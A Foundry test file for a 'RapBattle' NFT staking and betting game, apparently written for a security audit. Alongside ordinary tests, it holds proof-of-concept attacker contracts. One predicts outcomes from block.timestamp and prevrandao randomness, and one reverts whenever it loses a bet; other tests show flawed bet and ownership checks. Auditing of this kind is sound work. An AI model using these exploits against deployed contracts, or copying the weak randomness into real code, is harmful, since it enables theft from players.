// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console, Vm} from "../lib/forge-std/src/Test.sol";
import {RapBattle} from "../src/RapBattle.sol";
import {OneShot} from "../src/OneShot.sol";
import {Streets} from "../src/Streets.sol";
import {Credibility} from "../src/CredToken.sol";
import {IOneShot} from "../src/interfaces/IOneShot.sol";
import {ICredToken} from "../src/interfaces/ICredToken.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract RapBattleTest is Test {
    RapBattle rapBattle;
    OneShot oneShot;
    Streets streets;
    Credibility cred;
    IOneShot.RapperStats stats;
    address user;
    address challenger;

    address maliciousactor;
    address attacker;

    function setUp() public {
        oneShot = new OneShot();
        cred = new Credibility();
        streets = new Streets(address(oneShot), address(cred));
        rapBattle = new RapBattle(address(oneShot), address(cred));
        user = makeAddr("Alice");
        challenger = makeAddr("Slim Shady");

        maliciousactor = makeAddr("maliciousactor");
        attacker = makeAddr("attacker");

        oneShot.setStreetsContract(address(streets));
        cred.setStreetsContract(address(streets));
    }

    // mint rapper modifier
    modifier mintRapper() {
        vm.prank(user);
        oneShot.mintRapper();
        _;
    }

    modifier twoSkilledRappers() {
        vm.startPrank(user);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        vm.stopPrank();

        vm.startPrank(challenger);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 1);
        streets.stake(1);
        vm.stopPrank();

        vm.warp(4 days + 1);

        vm.startPrank(user);
        streets.unstake(0);
        vm.stopPrank();
        vm.startPrank(challenger);
        streets.unstake(1);
        vm.stopPrank();
        _;
    }

    // Test that a user can mint a rapper
    function testMintRapper() public {
        address testUser = makeAddr("Bob");
        vm.prank(testUser);
        oneShot.mintRapper();
        assert(oneShot.ownerOf(0) == testUser);
    }

    // Test that only the streets contract can update rapper stats
    function testAccessControlOnUpdateRapperStats() public mintRapper {
        vm.prank(user);
        vm.expectRevert();
        oneShot.updateRapperStats(0, true, true, true, true, 0);
    }

    // Test that only owner can set streets contract
    function testAccessControlOnSetStreetsContract() public {
        vm.prank(user);
        vm.expectRevert();
        oneShot.setStreetsContract(address(streets));
    }

    // test getRapperStats
    function testGetRapperStats() public mintRapper {
        stats = oneShot.getRapperStats(0);

        assert(stats.weakKnees == true);
        assert(stats.heavyArms == true);
        assert(stats.spaghettiSweater == true);
        assert(stats.calmAndReady == false);
        assert(stats.battlesWon == 0);
    }

    // Test getNexTokenId
    function testGetNextTokenId() public mintRapper {
        assert(oneShot.getNextTokenId() == 1);
    }

    // Test that a user can stake a rapper
    function testStake() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        (, address owner) = streets.stakes(0);
        assert(owner == address(user));
    }

    // Test that a user can unstake a rapper
    function testUnstake() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        (, address owner) = streets.stakes(0);
        assert(owner == address(user));
        streets.unstake(0);
        (, address newOwner) = streets.stakes(0);
        assert(newOwner == address(0));
    }

    // Test cred is minted when a rapper is staked for at least one day
    function testCredMintedWhenRapperStakedForOneDay() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        vm.stopPrank();
        vm.warp(1 days + 1);
        vm.startPrank(user);
        streets.unstake(0);

        assert(cred.balanceOf(address(user)) == 1);
    }

    // Test rapper stats are updated when a rapper is staked for at least one day
    function testRapperStatsUpdatedWhenRapperStakedForOneDay() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        vm.stopPrank();
        vm.warp(4 days + 1);
        vm.startPrank(user);
        streets.unstake(0);

        stats = oneShot.getRapperStats(0);
        assert(stats.weakKnees == false);
        assert(stats.heavyArms == false);
        assert(stats.spaghettiSweater == false);
        assert(stats.calmAndReady == true);
        assert(stats.battlesWon == 0);
    }

    // Test that a user can go on stage
    function testGoOnStage() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        rapBattle.goOnStageOrBattle(0, 0);
        address defender = rapBattle.defender();
        assert(defender == address(user));
    }

    // Test that rapper is transferred to rap battle contract when going on stage
    function testRapperTransferredToRapBattle() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        rapBattle.goOnStageOrBattle(0, 0);
        address owner = oneShot.ownerOf(0);
        assert(owner == address(rapBattle));
    }

    // test that a user can go on stage and battle
    function testGoOnStageOrBattle() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        rapBattle.goOnStageOrBattle(0, 0);
        vm.stopPrank();
        vm.startPrank(challenger);
        oneShot.mintRapper();
        oneShot.approve(address(rapBattle), 1);
        rapBattle.goOnStageOrBattle(1, 0);
    }

    // Test that bets must match when going on stage or battling
    function testBetsMustMatch() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        rapBattle.goOnStageOrBattle(0, 0);
        vm.stopPrank();
        vm.startPrank(challenger);
        oneShot.mintRapper();
        oneShot.approve(address(rapBattle), 1);
        vm.expectRevert();
        rapBattle.goOnStageOrBattle(1, 1);
    }

    // Test winner is transferred the bet amount
    function testWinnerTransferredBetAmount(uint256 randomBlock) public twoSkilledRappers {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 3);
        console.log("User allowance before battle:", cred.allowance(user, address(rapBattle)));
        rapBattle.goOnStageOrBattle(0, 3);
        vm.stopPrank();

        vm.startPrank(challenger);
        oneShot.approve(address(rapBattle), 1);
        cred.approve(address(rapBattle), 3);
        console.log("User allowance before battle:", cred.allowance(challenger, address(rapBattle)));

        // Change the block number so we get different RNG
        vm.roll(randomBlock);
        vm.recordLogs();
        rapBattle.goOnStageOrBattle(1, 3);
        vm.stopPrank();

        Vm.Log[] memory entries = vm.getRecordedLogs();
        // Convert the event bytes32 objects -> address
        address winner = address(uint160(uint256(entries[0].topics[2])));
        assert(cred.balanceOf(winner) == 7);
    }

    // Test that the defender's NFT is returned to them
    function testDefendersNftReturned() public twoSkilledRappers {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 10);
        rapBattle.goOnStageOrBattle(0, 3);
        vm.stopPrank();

        vm.startPrank(challenger);
        oneShot.approve(address(rapBattle), 1);
        cred.approve(address(rapBattle), 10);

        rapBattle.goOnStageOrBattle(1, 3);
        vm.stopPrank();

        assert(oneShot.ownerOf(0) == address(user));
    }

    // test getRapperSkill
    function testGetRapperSkill() public mintRapper {
        uint256 skill = rapBattle.getRapperSkill(0);
        assert(skill == 50);
    }

    // test getRapperSkill with updated stats
    function testGetRapperSkillAfterStake() public twoSkilledRappers {
        uint256 skill = rapBattle.getRapperSkill(0);
        assert(skill == 75);
    }

    // test onERC721Received in Streets.sol when staked
    function testOnERC721Received() public mintRapper {
        vm.startPrank(user);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        assert(
            streets.onERC721Received(address(0), user, 0, "")
                == bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))
        );
    }


    // `defender` and `challenger` can be same address in battle.
    function testStartBattleAsDefenderAndChallengerAreSameAddress() public {
        vm.startPrank(user);

        oneShot.mintRapper();
        oneShot.mintRapper();

        oneShot.approve(address(streets), 0);
        oneShot.approve(address(streets), 1);

        streets.stake(0);
        streets.stake(1);

        vm.warp(block.timestamp + 4 days);

        streets.unstake(0);
        streets.unstake(1);

        assertEq(cred.balanceOf(user), 8);

        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 8);


        rapBattle.goOnStageOrBattle(0, 4);
        rapBattle.goOnStageOrBattle(1, 4);

        vm.stopPrank();
    }

    // challenger can start a battle without even having an `Rapper NFT` and `CredToken`. by passing Other Peoples Rapper NFT tokenId that has better stats and just entering the same number as `defenderBet`, if he won, then he will the prize otherwise the transaction will reveret. 
    function testChallengerStartsBattleWithoutHavingAnCredTokenOrRapperNFT() public {
        vm.startPrank(user);
        oneShot.mintRapper();

        oneShot.approve(address(streets), 0);
        streets.stake(0);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(0);
        assertEq(cred.balanceOf(user), 4);

        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 4);
        rapBattle.goOnStageOrBattle(0, 4);

        vm.stopPrank();

        vm.startPrank(challenger);
        // challenger joins the battle without having `CredToken` or `RapperNFT`. now challenger either gonna win the battle and get `Cred` tokens as Reward, or this
        // will revert because of `credToken.transferFrom(msg.sender, _defender, _credBet);`, since challenger has no `Cred` token to transfer from himself to `defender`.
        rapBattle.goOnStageOrBattle(0, 4);
        vm.stopPrank();
    }

    // `_credBet` amount can be `0`, if an battle start's, it does not matter who won the battle, winner will receive nothing.
    function testGoOnStageWith_credBetAmounttoZero() public {
        vm.startPrank(user);
        oneShot.mintRapper();

        oneShot.approve(address(streets), 0);
        streets.stake(0);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(0);
        assertEq(cred.balanceOf(user), 4);

        oneShot.approve(address(rapBattle), 0);
        // cred.approve(address(rapBattle), 0);

        // `user` goes on stage as `defender` and set's `_credBet` to 0, which this can result in totalPrize to be `0`.
        rapBattle.goOnStageOrBattle(0, 0);
        vm.stopPrank();

        assertEq(rapBattle.defenderBet(), 0);
    }

    // we don't increment the winner of the battle RapperStats `battlesWon` number.
    function testBattlesWonOftheWinnerIsNotBeingIncremented() public {
        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
        vm.startPrank(user);

        oneShot.mintRapper();
        oneShot.approve(address(streets), 0);
        streets.stake(0);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(0);
        assertEq(cred.balanceOf(user), 4);

        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 4);
        rapBattle.goOnStageOrBattle(0, 4);

        vm.stopPrank();

        // challenger mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `challenger`.
        vm.startPrank(challenger);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 1);
        streets.stake(1);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(1);
        assertEq(cred.balanceOf(challenger), 4);

        oneShot.approve(address(rapBattle), 1);
        cred.approve(address(rapBattle), 4);
        rapBattle.goOnStageOrBattle(1, 4);

        vm.stopPrank();


        // the winner of the rap battle either was `defender` or `challenger`. this means that `battlesWon` number of the Winner Rapper NFT should've been incremented by 1.
        // defender tokenId is `0`
        // challenger tokenId is `1`
        // let's check it.
        IOneShot.RapperStats memory rapperStatsOfDefender =  oneShot.getRapperStats(0);
        IOneShot.RapperStats memory rapperStatsOfChallenger = oneShot.getRapperStats(1);

        vm.expectRevert(); // if the line below reverts, that means the `battlesWon` of the winner NFT, does not get incremented.
        assert(rapperStatsOfDefender.battlesWon == 1 || rapperStatsOfChallenger.battlesWon == 1);
    }

    // attacker can use weak Randomness to findout if his gonna win the battle or not.
    function testAttackerCanGuessWhoWins() public {
        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
        vm.startPrank(user);

        oneShot.mintRapper();
        oneShot.approve(address(streets), 0);
        streets.stake(0);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(0);
        assertEq(cred.balanceOf(user), 4);

        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 4);
        rapBattle.goOnStageOrBattle(0, 4);

        vm.stopPrank();

        // attacker mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `challenger`.
        AttackerJoinsBattle attackerContract = new AttackerJoinsBattle(oneShot, cred, rapBattle, streets);
        uint256 tokenId = oneShot.getNextTokenId();
        attackerContract.getRapperNftAndStakeIt(tokenId, 4 days);

        // take a look at `joinBattleToWin()` function in Attacker Contract, Which showcases how someone can guess random number if you use
        // global variables like block.timestamp and block.prevrandao.
        vm.expectEmit();
        emit RapBattle.Battle(address(attackerContract), tokenId, address(attackerContract));
        attackerContract.joinBattleToWin(tokenId);

        // attacker successfully won the battle and now has 8 cred Tokens.
        assertEq(cred.balanceOf(address(attackerContract)), 8);
    }


    // if the challenger is an smartContract, he can start a battle, and after he find out he lost the battle, reverts the whole transaction, if he won it, then he will just take the prize.
    function testAttackerJoinsTheBattleAsSmartContractRevertsifheLosesBattleOtherwiseTakesThePrizeIfWon() public {
        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
        vm.startPrank(user);

        oneShot.mintRapper();
        oneShot.approve(address(streets), 0);
        streets.stake(0);

        vm.warp(block.timestamp + 4 days);
        streets.unstake(0);
        assertEq(cred.balanceOf(user), 4);

        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 4);
        rapBattle.goOnStageOrBattle(0, 4);

        vm.stopPrank();


        AttackerRevertsIfHeLoses attackerContract = new AttackerRevertsIfHeLoses(oneShot, cred, rapBattle, streets);
        uint256 tokenId = oneShot.getNextTokenId();
        attackerContract.getRapperNftAndStakeIt(tokenId, 4 days);
        // next line will revert if we lose the battle. otherwise we are the winner and gonna receive the `defenderBet` as Prize.
        attackerContract.revertIfLostBetOtherwiseTakeThePrize(tokenId);
    }




}



contract AttackerRevertsIfHeLoses is Test, IERC721Receiver {

        IOneShot immutable oneShot;
        Credibility immutable credToken;
        RapBattle immutable rapBattle;
        Streets immutable streets;

        constructor(IOneShot _oneShot, Credibility _credToken, RapBattle _rapBattle, Streets _streets) {
            oneShot = IOneShot(_oneShot);
            credToken = _credToken;
            rapBattle = RapBattle(_rapBattle);
            streets = _streets;
        }

        function revertIfLostBetOtherwiseTakeThePrize(uint256 _tokenId) external {
            require(rapBattle.defender() != address(0), "There's No Defender Yet Waiting for an Challenger.");
            uint256 credTokenBalance = credToken.balanceOf(address(this));
            require(credTokenBalance >= rapBattle.defenderBet(), "Not Enough Balance to Join the Battle as Challenger.");

            oneShot.approve(address(rapBattle), _tokenId);
            credToken.approve(address(rapBattle), rapBattle.defenderBet());
            rapBattle.goOnStageOrBattle(_tokenId, rapBattle.defenderBet());

            require(credToken.balanceOf(address(this)) > credTokenBalance, "Let's Revert Because We Lose the Bet.");
        }
        

        function getRapperNftAndStakeIt(uint256 _tokenId, uint256 _days) external {
            oneShot.mintRapper();
            oneShot.approve(address(streets), _tokenId);
            streets.stake(_tokenId);

            vm.warp(block.timestamp + _days);
            streets.unstake(_tokenId);
        }


        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
            return IERC721Receiver.onERC721Received.selector;
        }

}







contract AttackerJoinsBattle is Test, IERC721Receiver {

    IOneShot immutable oneShot;
    Credibility immutable credToken;
    RapBattle immutable rapBattle;
    Streets immutable streets;

    constructor(IOneShot _oneShot, Credibility _credToken, RapBattle _rapBattle, Streets _streets) {
        oneShot = IOneShot(_oneShot);
        credToken = _credToken;
        rapBattle = RapBattle(_rapBattle);
        streets = _streets;
    }

    function joinBattleToWin(uint256 _tokenId) external {
        require(rapBattle.defender() != address(0), "There's No Defender Yet Waiting for an Challenger.");
        require(credToken.balanceOf(address(this)) >= rapBattle.defenderBet(), "Not Enough Balance to Join the Battle as Challenger.");

        uint256 defenderRapperSkill = rapBattle.getRapperSkill(rapBattle.defenderTokenId());
        uint256 challengerRapperSkill = rapBattle.getRapperSkill(_tokenId);
        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;

        uint256 i;
        while (true) {
            vm.warp(block.timestamp + i);
            uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % totalBattleSkill;
            if (random > defenderRapperSkill) {
                oneShot.approve(address(rapBattle), _tokenId);
                credToken.approve(address(rapBattle), rapBattle.defenderBet());
                rapBattle.goOnStageOrBattle(_tokenId, rapBattle.defenderBet());
                break;
            }    
            i++;
        }

    }

    function getRapperNftAndStakeIt(uint256 _tokenId, uint256 _days) external {
        oneShot.mintRapper();
        oneShot.approve(address(streets), _tokenId);
        streets.stake(_tokenId);

        vm.warp(block.timestamp + _days);
        streets.unstake(_tokenId);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}



